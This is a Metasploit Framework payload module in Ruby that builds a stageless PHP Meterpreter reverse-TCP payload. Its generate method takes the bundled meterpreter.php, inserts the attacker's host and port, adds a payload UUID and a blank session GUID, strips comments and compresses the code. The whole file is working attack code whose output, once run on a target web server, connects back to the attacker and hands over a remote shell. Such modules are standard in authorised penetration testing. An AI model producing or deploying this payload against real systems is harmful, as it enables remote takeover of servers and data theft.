##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/php/reverse_tcp'
require 'msf/base/sessions/meterpreter_php'
require 'msf/base/sessions/meterpreter_options'


module MetasploitModule

  CachedSize = 30658

  include Msf::Payload::Single
  include Msf::Payload::Php::ReverseTcp
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'PHP Meterpreter, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a Meterpreter server (PHP)',
      'Author'        => ['egypt'],
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'License'       => MSF_LICENSE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::Meterpreter_Php_Php))
  end

  def generate
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')

    met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
    met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']

    uuid = generate_payload_uuid
    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub(%q|"PAYLOAD_UUID", ""|, %Q|"PAYLOAD_UUID", "#{bytes}"|)

    # Stageless payloads need to have a blank session GUID
    session_guid = '\x00' * 16
    met = met.sub(%q|"SESSION_GUID", ""|, %Q|"SESSION_GUID", "#{session_guid}"|)

    met.gsub!(/#.*$/, '')
    met = Rex::Text.compress(met)
    met
  end
end
